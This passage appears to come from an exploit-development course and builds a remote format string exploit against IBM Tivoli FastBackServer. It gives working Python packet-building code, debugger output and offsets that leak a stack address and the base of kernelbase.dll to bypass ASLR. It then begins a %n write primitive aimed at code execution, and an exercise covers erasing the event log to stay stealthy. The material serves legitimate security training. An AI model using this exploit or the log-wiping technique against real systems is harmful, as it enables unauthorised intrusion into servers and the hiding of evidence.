+When the proof of concept is executed, we will check the Start value against the associated data size.
+kali@kali:~$ python3 poc.py 192.168.120.10
+Start value of 0x0 Yields a data size of: 0x100000
+Start value of 0x1000 Yields a data size of: 0x100000
+Start value of 0x2000 Yields a data size of: 0x100000
+...
+Start value of 0x60000 Yields a data size of: 0x100000
+Start value of 0x61000 Yields a data size of: 0x100000
+Start value of 0x62000 Yields a data size of: 0xe3603
+Start value of 0x63000 Yields a data size of: 0x1
+Start value of 0x64000 Yields a data size of: 0x1
+Start value of 0x65000 Yields a data size of: 0x1
+Listing 79 - Enumerating Start values
+As highlighted in Listing 79, the output offers three data size options:
+1.	0x10000, meaning we have not found the end of the log yet.
+2.	Between 0x1 and 0x10000, meaning we have found the end of the log.
+3.	0x1, meaning the Start value is too large.
+We'll remember that after running the testing code and obtaining the error, we have to restart FastBackServer for the data size return value to be correct.
+If the Tivoli installation has been running for a long time, the event log may have grown so large that initial requests will also return a value of 0x1.
+We could simply pick the first Start value that results in a data size between 0x1 and 0x100000, but that might lead to some issues.
+Our selection of the Start value happens before the stack leak is performed. This means that additional data will be written to the event log before we use the Start value to read the stack address.
+Figure 37 illustrates how the distance from the Start value to the end of the log file must be less than 0x100000 both before and after the stack leak.
+ 
+Figure 37: Read before and after stack address leak
+If we select a Start value where the returned size is close to 0x100000, data written to the event log between our enumeration and the read of the leak could put the stack address outside that range.
+Likewise, if the result returned is 0x1 due to the Start value being too large, we will encounter issues with the read method in subsequent calls.
+We can address this issue by using the returned data size to calculate the optimal Start value. We'll recall that the Length value is left-shifted by 8 bits before being used, which means the data size returned can be right-shifted and added to the Start value.
+Our calculations will result in a Start value that points right to the end of the log file before the stack leak is triggered. It is very likely that another read from the event log will contain the leaked stack address.
+Listing 80 shows the required code modifications for our calculations.
+while True:
+	...
+	s.send(buf)
+	response = s.recv(4)
+	size = int(response.hex(),16)
+	print("Start value of: " + str(hex(startValue)) + " yields a data size of: " + str(hex(size)))
+	if size < 0x100000:
+		size = size >> 8
+		startValue += size
+		break
+	startValue += 0x1000
+	s.close()
+	
+print("The optimal start value is: " + str(hex(startValue)))
+Listing 80 - Improved code to enumerate Start values
+Listing 81 shows the updated code in action.
+kali@kali:~$ python3 poc.py 192.168.120.10
+...
+Start value of: 0x5f000 yields a data size of: 0x100000
+Start value of: 0x60000 yields a data size of: 0x100000
+Start value of: 0x61000 yields a data size of: 0x100000
+Start value of: 0x62000 yields a data size of: 0x9b103
+The optimal start value is: 0x629b1
+Listing 81 - Located optimal Start value
+We have now succeeded in dynamically locating the optimal Start value. This will allow us to read newly-added content to the event log.
+We'll note that when FastBackServer has been installed and running for a while, large Start values are common. We can speed up the exploit for development purposes by starting at a high initial value instead of 0.
+In this section, we learned how to select both the Length and the Start values so that we will be able to read the formatted string containing the stack address from the event log.
+Exercises
+1.	Repeat the analysis and locate the optimal Length and Start values.
+2.	Rewrite the code for locating the optimal Start value into a function.
+11.4.2. Leak Stack Address Remotely
+Finally, we have analyzed all the required pieces to perform a remote stack address leak. In this section, we will combine the format string vulnerability with the ability to read from the event log to obtain the stack address on our Kali machine.
+Earlier in this module, we located the event log entry containing the stack address leak. This is repeated in Listing 82.
+PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1
+[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696620746120646e746e65672578252025782578257825782578257825782578257825782578257825
+Listing 82 - Formatted string as an event entry
+Even with our ability to read from the log file, we cannot easily pinpoint this specific entry nor the stack address itself.
+We can locate it easily if we modify the format string to contain a unique header, and then search through the event log data for it.
+The formatted string also contains multiple values and we must identify the correct value representing the stack address. We can address this by inserting a symbol between each format specifier.
+Listing 83 shows the modified psCommandBuffer of the previous Python script invoking the EventLog function.
+# psCommandBuffer
+buf += b"w00t:" + b"%x:" * 0x80  
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+Listing 83 - Unique value is inserted in format string
+The first part of the psCommandBuffer has been prepended with the unique header value "w00t", as well as a colon between each format string specifier.
+After updating the format string vulnerability code, let's examine how this helps us read the content written to the event log.
+Since the event log is written to frequently, we'll set a breakpoint in WinDbg on the call to AGI_S_GetAgentSignature (Listing 84). This will pause all other writes to the event log by the application.
+Once the breakpoint is hit, we can step over the call and find the stack address is written to the event log:
+0:078> bp FastBackServer!AGI_S_GetAgentSignature+0xd8
+
+0:078> g
+Breakpoint 0 hit
+eax=0d993b30 ebx=0621b758 ecx=021df978 edx=00976a78 esi=0621b758 edi=00669360
+eip=0054b69b esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+FastBackServer!AGI_S_GetAgentSignature+0xd8:
+0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)
+
+0:007> p
+eax=00000001 ebx=0621b758 ecx=0d93d184 edx=76fc1670 esi=0621b758 edi=00669360
+eip=0054b6a0 esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
+FastBackServer!AGI_S_GetAgentSignature+0xdd:
+0054b6a0 83c410          add     esp,10h
+Listing 84 - Breakpoint on call to EventLog
+Since WinDbg has paused FastBackServer, no additional writes are performed.
+With the entry written, let's dump the newest entries from the event log with PowerShell.
+PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 2
+[May 03 16:01:49:475](174c)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent w00t:c4:d93ded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825
+[May 03 16:01:49:475](174c)-->W8.AGI            :       ..:c4:d93df96:3a:25:6c:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:25
+Listing 85 - Dumping the newest events from the event log
+The content of the event log shows that our "w00t" is prepended to the format specifiers, and each value inserted by the format specifiers is separated by colons.
+We'll also note that the leaked stack address is the second value after the "w00t" header. This modification will allow us to parse the retrieved data in Python by searching for the line that starts with "w00t", split that line on colons, and select the second value.
+At this point, we need to combine the code for triggering the format string vulnerability with the code for locating the optimal Start value, as well as implement code to read the newest entries.
+First, let's find the Start value. We can do this by implementing the previous while loop inside a function (findStartValue) to make the code easier to manage. After locating the optimal Start value, we'll insert the code to trigger the format string vulnerability.
+Finally, we need to read the contents of the event log, so let's review some aspects of how TCP traffic works.
+TCP guarantees that all the network data is delivered, and delivered in the right order. It does not, however, specify how many network packets are used to transmit the data, or whether they will be of equal size.
+To ensure we receive all the event log data, we must detect when there is none left. Luckily, this is easy since FastBackServer returns the total data size in the first 4 bytes.
+Listing 86 shows the code related to detecting when all data has been received. We'll need to keep in mind that the code to locate the Start value triggering the format string vulnerability, as well as reading from the event log, is also required.
+...
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((server, port))
+s.send(buf)
+
+responseSize = s.recv(4)
+size = int(responseSize.hex(),16)
+print("The eventlog returned contains %x bytes" % size)
+
+aSize = 0
+eventData = b""
+while True:
+	tmp = s.recv(size - aSize)
+	aSize += len(tmp)
+	eventData += tmp
+	if aSize == size:
+		break
+s.close()
+print("The size read is: " + str(hex(aSize)))
+print(eventData)
+...
+Listing 86 - Python code to receive the event log
+We can implement the while loop shown in Listing 86 to first get the size of the total reply and keep reading from the socket until we have received that amount of data, aggregating the size in aSize and data in eventData.
+To track the progress of our code, we can print the size of the event log data we expect to receive. After we are done receiving data, we will print the aggregated amount along with the event log data itself.
+Execution of the updated proof of concept is shown in Listing 87.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x7cc1a
+Stack address is written to event log
+The eventlog returned contains da03 bytes
+The size read is: 0xda03
+b"  \n[May 13 23:07:56:133](14d8)->I4.FX_AGENT 
+...
+\n[May 13 23:07:56:915](1704)-->W8.AGI      \t:\tAGI_S_GetAgentSignature: couldn't find agent w00t:c4:217dded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a782\n[May 13 23:07:57:039](14d8)->I4.FX_AGENT \t:\t3 - Command 0x0\ttime=0
+...
+Listing 87 - Reading the eventlog containing the stack address
+The output has been truncated to only show the relevant event log data.
+The highlighted portion of the output given in the listing above shows the presence of the unique header and a stack address in the data we received.
+Next, we'll use the header value to dynamically locate the stack address in the event log data.
+The required parsing code is given in Listing 88.
+data = eventData.split(b"w00t:")
+values = data[1].split(b":")
+stackAddr = int(values[1],16)
+print("Leaked stack address is: " + str(hex(stackAddr)))
+Listing 88 - Code to parse the event log
+First, we'll use the split1 function by supplying the string "w00t:" and breaking up the entire event log into two byte arrays (data).
+In the second index of the array (data[1]), we find the stack address. It comes after the static "c4:" value, meaning we can perform another split on the ":" delimiter and the stack address will be in the second entry (with an index of 1).
+Once the stack address is located, it is converted into an integer and printed to the console.
+Listing 89 shows the entire exploit code in action.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x666ea
+Stack address is written to event log
+The eventlog returned contains 6b03 bytes
+The size read is: 0x6b03
+Leaked stack address is: 0x237dded4
+Listing 89 - Locate stack address remotely
+We have remotely triggered the format string vulnerability and retrieved the stack address. Excellent!
+Exercises
+1.	Follow the analysis and use a unique header to locate the correct log entry.
+2.	Combine the previous proofs of concept to obtain one script that remotely leaks the stack address.
+3.	Is the stack address static across multiple executions of the exploit?
+1 (tutorialspoint, 2020), https://www.tutorialspoint.com/python3/string_split.htm
+11.4.3. Saving the Stack
+In the previous section, we managed to remotely trigger a format string specifier attack that writes a stack address to the event log. We were then able to request and parse the relevant portion of the event log to obtain it.
+If we run the exploit multiple times without restarting the FastBackServer service, we'll notice that the stack address changes every time.
+This is common for applications that handle multiple simultaneous connections by creating a new thread for each connection.
+In these types of applications, when the socket is closed, the thread is terminated. The stack address we leaked is no longer valid since each thread has a separate stack. To make use of the stack address, we must ensure that the thread is not terminated before our exploit completes.
+We can avoid the stack address changing by using the same socket session to both trigger the stack leak and the event log read.
+When we determined the optimal Start value earlier, we could leverage multiple socket connections because we had not yet leaked the stack address.
+We must create the socket and perform the connection once, but this introduces an issue to solve. When we send the packet with the format string specifiers that trigger the stack leak, data is also returned to us.
+This didn't matter to us previously because we don't need that data and the socket was simply closed, thus flushing any data from the connection. When we operate within the same connection, however, we must always read all available data before sending a new packet.
+Listing 90 shows the code needed to receive the reply.
+s.send(buf)
+
+responseSize = s.recv(4)
+size = int(responseSize.hex(),16)
+
+aSize = 0
+while True:
+	tmp = s.recv(size - aSize)
+	aSize += len(tmp)
+	if aSize == size:
+		break	
+
+print("Stack address is written to event log")
+Listing 90 - Receive all data sent as a reply
+The code is almost identical to that used to receive the event log data, except that we do not keep an aggregate of data.
+Next, we'll run the exploit as shown in Listing 91.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x673f0
+Stack address is written to event log
+The eventlog returned contains 5d03 bytes
+The size read is: 0x5d03
+Leaked stack address is: 0x27bdded4
+Listing 91 - The updated code leaks the stack from the same connection session
+We obtain the same type of output as earlier, including the leak of the stack address.
+While the change introduced in this section seems negligible, it will be very important in the next section, when we take the stack leak one step forward and bypass ASLR.
+Exercises
+1.	Update the proof of concept to use only a single connection when performing the stack leak and event log read.
+2.	Is it possible to perform all actions in the exploit from a single connection and, if so, does it increase the efficiency?
+11.4.4. Bypassing ASLR
+Achieving a remote leak of a stack address is interesting, but it does not directly allow us to bypass ASLR and in such a way that we can build a ROP chain. We must leak an address inside either a Tivoli module or a native DLL.
+In this section, we will build upon the stack leak and reuse the format string specifier vulnerability to obtain the base address of Kernelbase.dll.
+First, we need to understand how the leaked stack address can provide us with an address inside Kernelbase.dll, and then we will work to obtain it.
+When we made a connection in the previous section, a new thread was created to handle the packets. It is a stack address from this new thread that was leaked back to us. If we pause Python execution after leaking the stack address, but before closing the connection to FastBackServer, we can inspect the contents at that stack address in WinDbg.
+To pause execution of our Python script, we'll use the input1 function to wait for console input before we call the close method on the socket.
+stackAddr = int(values[1],16)
+print("Leaked stack address is: " + str(hex(stackAddr)))
+input();
+s.close()
+sys.exit(0)
+Listing 92 - Pause Python execution with input
+We'll note that the call to close the connection is moved to just before the script terminates.
+When the script executes, we obtain the stack address and execution waits for our console input, as shown in Listing 93.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61ca1
+Stack address is written to event log
+The eventlog returned contains 1203 bytes
+The size read is: 0x1203
+Leaked stack address is: 0x1035ded4
+Listing 93 - Execution is paused after leaking the stack address
+Now we can attach WinDbg to FastBackServer and inspect the contents at the leaked stack address.
+The stack often contains pointers to various DLLs that we could use to bypass ASLR. To locate consistent addresses, let's start by inspecting data close to the currently leaked address across multiple reruns of both the exploit and the service.
+Listing 94 shows the stack content at lower addresses than the leaked one. Trial and error reveals that pointers located at higher addresses are not stable across multiple packet transmissions.
+0:063> dds 1035ded4-200*4 L200
+1035d6d4  00000000
+1035d6d8  00000000
+...
+1035dd68  00000320
+1035dd6c  00000001
+1035dd70  7720f11f ntdll!RtlDeactivateActivationContextUnsafeFast+0x9f
+1035dd74  1035dde0
+1035dd78  745dc36a KERNELBASE!WaitForSingleObjectEx+0x13a
+1035dd7c  745dc2f9 KERNELBASE!WaitForSingleObjectEx+0xc9
+1035dd80  00669360 FastBackServer!_beginthreadex+0x6b
+1035dd84  7720e323 ntdll!RtlActivateActivationContextUnsafeFast+0x73
+...
+Listing 94 - Kernelbase pointers on the stack
+The output in the listing above is greatly truncated due to the amount of data.
+We'll find numerous pointers to Kernelbase.dll, ntdll.dll, and FastBackServer.exe on the stack. At first glance, any of those pointers could be used, but there are some considerations to take into account.
+Addresses in FastBackServer.exe contain null bytes, so these are not a good candidate for generating a ROP chain.
+To execute shellcode, we must invoke an API like VirtualProtect or VirtualAlloc, but ntdll.dll only contains low level versions of these that take more complicated arguments.
+To preserve stability, we should choose a pointer inside Kernelbase.dll that is a decent amount of bytes lower than the leaked address. This ensures that the same pointer is present at the same location on multiple reruns of the exploit and across an arbitrary amount of transmitted packets.
+Through trial and error, we'll discover the address KERNELBASE!WaitForSingleObjectEx+0x13a, highlighted in Listing 94, remains stable at the same stack offset. We'll use this during the remainder of this module.
+Next, we need to calculate the offset from the leaked stack address to the address containing the pointer.
+0:063> ? 1035ded4-1035dd78
+Evaluate expression: 348 = 0000015c
+Listing 95 - Offset from leaked stack address to Kernelbase.dll pointer
+We find the offset to be the static value 0x15C. We should note that this offset must be subtracted from the leaked stack address.
+Since this offset remains constant across multiple reruns of the exploit, we know where an address into Kernelbase.dll is located in memory when the stack address is leaked back to us.
+Let's use this knowledge to obtain the pointer remotely. We will reuse our two basic building blocks: the format string specifier vulnerability and our ability to remotely read the event log.
+When the "%x" specifier is used, an integer is inserted into the string and interpreted as a hexadecimal value. However, the "%s" specifier interprets the argument as a character array, meaning the argument itself is a memory pointer to a null byte-terminated series of ASCII characters.
+The format string function uses the specifier by dereferencing the argument and inserting the contents at that memory location into the processed format string.
+If we could put a string specifier into the call to EventLog and make it use the leaked stack address, plus the offset as an argument, it would read out the address inside Kernelbase.dll.
+Let's put this theory to the test. We'll start by reviewing how the vulnerable vsnprintf format string function works.
+Listing 96 repeats the function prototype of vsnprintf.
+int vsnprintf(
+  char *s,
+  size_t n,
+  const char *format,
+  va_list arg
+);
+Listing 96 - Function prototype for vsnprintf
+We know that the format string supplied to this function is controlled by us, so we can replace any "%x" with "%s". In the current leak of the stack address, we did not have to do anything, since the stack address was already present, but this time we must also provide the address to leak from.
+The arguments for the format string specifier come from the array supplied as the fourth argument (arg). This means if we can somehow influence the contents of this array, the stack address to read from can be inserted within.
+Let's execute our current proof of concept and inspect the call to vnsprintf at FastBackServer!EventLog_wrapted+0x2dd. Sadly, we discover it is not productive to set a breakpoint either here or inside the EventLog function due to their common usage.
+Instead, we'll set a breakpoint at FastBackServer!AGI_S_GetAgentSignature+0xd8, just like in our initial vulnerability analysis, and then set a breakpoint on FastBackServer!EventLog_wrapted+0x2dd which is only triggered in the same threat context through the keyword ~.2
+Once we reach it, we can display the contents of the fourth argument, which is the array used with the format string specifiers:
+eax=0000002d ebx=0614aa10 ecx=1079dca5 edx=000001c7 esi=0614aa10 edi=00669360
+eip=004803fa esp=1079dc14 ebp=1079dea4 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!EventLog_wrapted+0x2dd:
+004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133)
+
+0:082> dc poi(esp+c)
+1079deb8  000000c4 1079ded4 0000003a 00000025  ......y.:...%...
+1079dec8  0000012e 00000078 00000000 5f494741  ....x.......AGI_
+1079ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
+1079dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
+1079def8  6120646e 746e6567 30307720 78253a74  nd agent w00t:%x
+1079df08  3a78253a 253a7825 78253a78 3a78253a  :%x:%x:%x:%x:%x:
+1079df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
+1079df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
+Listing 97 - Contents of the array argument to vsnprintf
+Interestingly, we'll observe that the unique header "w00t", which we provided along with the format string specifiers themselves, has become part of the arguments.
+This means that if we insert a value just after the header, it will be used as an argument for vsnpritnf and become part of the formatted string that is written to the event log.
+We notice in Listing 97 that due to alignment of the header, we must add two additional bytes before the values we want to be processed in order for our value to be taken as a separate DWORD.
+Let's test this by modifying our proof of concept, as shown in Listing 98.
+...
+# psCommandBuffer
+buf += b"w00t:BBAAAA" + b"%x:" * 0x80  
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+...
+values = data[1].split(b":")
+print(values)
+...
+Listing 98 - Appending A's after the header
+The two B's have been appended to the header to account for alignment explained above, followed by four A's, which we'll invoke through the specifier as a trial.
+We have also added a print statement of the event log after it has been split on the ":" delimiter. We can use this to verify our theory without using the debugger.
+When the code is executed, we find the four A's, as highlighted in Listing 99.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61fe7
+Stack address is written to event log
+The eventlog returned contains 1103 bytes
+The size read is: 0x1103
+[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t', b'\t1 - ...
+Leaked stack address is: 0x1029ded4
+Listing 99 - Output from appending A's
+This proves that we can provide arbitrary null-free input that will be processed by vsnprintf. To trigger a read of its location, we must replace the appropriate "%x" specifier with a "%s".
+Counting the number of formatted DWORDs in Listing 99, we find the 41414141 value in the 21st position.
+We can now update our proof of concept. First, we'll revert the changes in the initial stack leak packet. We can then make a copy, as shown in Listing 100, to be executed after the stack address is leaked back to us.
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x604)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+	
+# psCommandBuffer
+buf += b"w00t:BBAAAA" + b"%x:" * 20
+buf += b"%s"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+
+s.send(buf)
+Listing 100 - A %s specifier is inserted in the 20th position
+When the updated code is executed, the stack address will be leaked as normal, and then the new packet is processed. This will cause vsnprintf to interpret the four A's, or 0x41414141, as a pointer to a character array.
+Since we have not provided a valid address yet, we can expect an access violation when the four A's are being treated as an address.
+Listing 101 shows the result of executing the updated code.
+(2384.2490): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=00000073 ecx=41414141 edx=7fffffff esi=7ffffffe edi=00000800
+eip=00672ead esp=0db7d964 ebp=0db7dbbc iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+FastBackServer!_output+0x49a:
+00672ead 803800          cmp     byte ptr [eax],0           ds:0023:41414141=??
+
+0:081> k
+ # ChildEBP RetAddr  
+00 0db7dbbc 0066bf8e FastBackServer!_output+0x49a
+01 0db7dbf4 0065b14b FastBackServer!_vsnprintf+0x2c
+02 0db7dc0c 004803ff FastBackServer!ml_vsnprintf+0x18
+03 0db7dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
+04 0db7e2d4 0054b6a0 FastBackServer!EventLog+0x13c
+05 0db7e31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
+06 0dbdfe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
+07 0dbdfeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+Listing 101 - vsnprintf tries to process 0x41414141 as a string pointer
+From the call stack, we find that an access violation indeed comes from the call to vsnprintf because of the invalid string pointer we provided.
+This provides us with confidence that this attack will indeed work.
+Next, we will replace the static A's with the leaked stack address, adjusted for the offset. We must also read the leaked pointer to Kernelbase.dll from the event log and parse the data returned to us.
+Listing 102 shows the updated code.
+...
+targetAddr = stackAddr - 0x15c
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x604)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += b"w00t:BB" + pack("<i", targetAddr) + b"%x:" * 20
+buf += b"%s"
+buf += b"%x" * 0x6b 
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+
+s.send(buf)
+
+responseSize = s.recv(4)
+size = int(responseSize.hex(),16)
+
+aSize = 0
+while True:
+	tmp = s.recv(size - aSize)
+	aSize += len(tmp)
+	if aSize == size:
+		break	
+...
+Listing 102 - Using the target stack address with %s
+First, we'll modify the code to use the leaked stack address after subtracting the offset for the return value.
+Next, we will add code to receive the response from the server. This is not data we need, but we must clear the receive buffer to subsequently read from the event log.
+Once both leak packets have been sent, the address into kernelbase.dll will be written to the event log and we can read it out.
+There is one issue we have to solve first. When we perform the stack leak and subsequent read, we're relying on the enumerated optimal Start value. When we leak the kernelbase.dll pointer, another "w00t" header is written to the event log.
+If we perform a read, we would also read out the previous content and would have to filter out the first leak. The event log may also grow in the time between the two reads.
+We can address this issue by adding the amount of data we read from the event log when we found the stack address to the Start value.
+This will start the reading operation later in the event log, enabling us to avoid multiple leaked values at once. Using this method also prevents the event log from growing in such a way that our read primitive cannot obtain the new value.
+We can implement this solution quite easily by right-shifting the amount of data we have read by 8 and adding that to the Start value. The implementation is shown in Listing 103.
+...
+print("The size read is: " + str(hex(aSize)))
+startValue += (aSize >> 8)	
+
+data = eventData.split(b"w00t:")
+values = data[1].split(b":")
+...
+Listing 103 - Updating the Start value
+Note that this occurs right after we have read the data from the event log the first time.
+Finally, we need to parse the event log that was returned the second time. We can once again split on the "w00t:" header and subsequently split on the ":" delimiter. This time we must grab the 21st entry, which has the index 20.
+The updated code requires another packet to fetch the event log entry, as well as the code shown in Listing 104.
+print("The size read is: " + str(hex(aSize)))
+	
+data = eventData.split(b"w00t:")
+values = data[1].split(b":")
+kbString = (values[20])[0:4]
+kernelbaseAddr = kbString[3] << 24
+kernelbaseAddr += kbString[2] << 16
+kernelbaseAddr += kbString[1] << 8
+kernelbaseAddr += kbString[0] 
+
+print("Leaked Kernelbase address is: " + str(hex(kernelbaseAddr)))
+Listing 104 - Parsing the event log for kernelbase.dll address
+The 21st entry also happens to be the last included in the formatted string. This means when we perform the split, additional data will be included. Let's avoid this by grabbing only the first four bytes into the kbString variable.
+To properly view the kernelbase.dll address, we'll need to switch the endianness, which is implemented by a simple bit shift. Lastly, the located address is printed to the console.
+Our final step is to find the offset from the leaked kernelbase pointer to its base address.
+0:006> ? KERNELBASE!WaitForSingleObjectEx+0x13a - kernelbase
+Evaluate expression: 1098602 = 0010c36a
+Listing 105 - Offset from WaitForSingleObjectEx+0x13a to base address
+We can now subtract this static offset from the leaked kernelbase address to give us the module base address. When the updated exploit is executed, the leaked kernelbase address is printed.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61eea
+Stack address is written to event log
+The eventlog returned contains 3e03 bytes
+The size read is: 0x3e03
+Leaked stack address is: 0x1215ded4
+Kernelbase address leaked to event log
+The eventlog returned contains 2303 bytes
+The size read is: 0x2303
+Leaked Kernelbase address is: 0x745dc36a
+Kernelbase base address is: 0x744d0000
+Listing 106 - Leaking the base address of kernelbase.dll
+Our efforts have paid off! We have remotely obtained the base address of kernelbase.dll, which allows us to completely bypass ASLR. Excellent!
+Our work so far has enabled us to read from anywhere inside the process memory space we desire. The result of our work is commonly known as a read primitive.
+Exercises
+1.	Go through the analysis performed in this section.
+2.	Put all the pieces of the exploit together and remotely obtain the base address of kernelbase.dll to bypass ASLR.
+Extra Mile
+Combine the ASLR bypass with one of the previously-exploited memory corruption vulnerabilities in FastBackServer to build a ROP chain and obtain remote code execution.
+Extra Mile
+When we use the format string function and the event log to read and write from memory, we generate a large amount of event log entries. In the spirit of stealth, it would be nice to clear the event log once our attack is complete.
+Earlier in the module, we found two cross references to the EventLOG_sSFILE global variable. The cross reference we used let us remotely read the event log. The other cross reference leads to a basic block containing a pointer to the string "Event Log Erased".
+Perform the required reverse engineering to understand what this code branch does and how to trigger it. Finally, modify the proof of concept to delete contents from the event log after we have bypassed ASLR.
+1 (Python, 2020), https://docs.python.org/3/library/functions.html#input
+2 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bp--bu--bm--set-breakpoint-
+11.5. Wrapping Up
+This module introduced the concept of a read primitive through a format string vulnerability. Through extensive reverse engineering and analysis, we have managed to build an exploit that remotely bypasses ASLR.
+A remote ASLR bypass can be combined with a memory corruption vulnerability, like a stack buffer overflow, to bypass Windows mitigations and obtain remote code execution. In the next module, we will return to the format string vulnerability and leverage it to create a write primitive as well. 
+12. Format String Specifier Attack Part II
+In the previous module, we performed extensive reverse engineering to find a way to leverage a format string vulnerability and develop a read primitive. Our read primitive was able to read memory contents at an arbitrary, null-free address.
+We used our read primitive to bypass ASLR, which can be used in combination with a memory corruption vulnerability to create an exploit bypassing both ASLR and DEP.
+In this module, we will explore ways to use the same format string vulnerability to gain code execution without needing an additional vulnerability.
+12.1. Write Primitive with Format Strings
+As with most complicated exploits, we need to go through several steps, so we'll divide up the required work. We have already leaked the base address of kernelbase.dll through a read primitive. Next, let's determine whether we might be able to create a write primitive, which we can use to modify content in memory.
+Many advanced exploits leverage both read and write primitives to bypass mitigations and obtain code execution. In the next few sections, we'll create a write primitive, which we'll use later in the module to overwrite EIP and achieve code execution.
+Depending on the application, there are various ways to create a read or write primitive. In our case, we'll start by revisiting some aspects of format specifier theory.
+12.1.1. Format String Specifiers Revisited
+We've been working with both hexadecimal and string format specifiers so far. In the module regarding Format String Specifier Attacks, we briefly explored other specifiers, such as decimal and floating point.
+These specifiers only let us read data or memory, but there's a unique specifier for us to focus on called %n.
+Rather than formatting or helping to print text, this specifier writes the number of characters processed into a supplied address.1 Listing 1 shows an example of how the %n specifier can be used with printf.
+printf("This is a string %n", 0x41414141);
+Listing 1 - Example use of %n in printf
+When this code is executed, the hardcoded string is printed to the console and its length (0x11) is written to the address 0x41414141. If the provided address is not valid, an access violation is raised.
+Note that the length written does not include the format string specifier, but only the characters preceding it.
+Since this format specifier writes to memory, it poses a potential security risk, so compilers like Visual Studio have disabled it by default.2
+However, if a less secure compiler is used or %n has been enabled, we can attempt to leverage it to create a write primitive.
+Let's find out if this is possible with FastBackServer. We can reuse our previous code to send a string format specifier, replacing it with %n.
+A standalone script for this check is given in Listing 2.
+import socket
+import sys
+from struct import pack
+
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
+	
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+
+	# psAgentCommand
+	buf = pack(">i", 0x400)
+	buf += bytearray([0x41]*0xC)
+	buf += pack("<i", 0x604)  # opcode
+	buf += pack("<i", 0x0)    # 1st memcpy: offset
+	buf += pack("<i", 0x100)  # 1st memcpy: size field
+	buf += pack("<i", 0x100)  # 2nd memcpy: offset
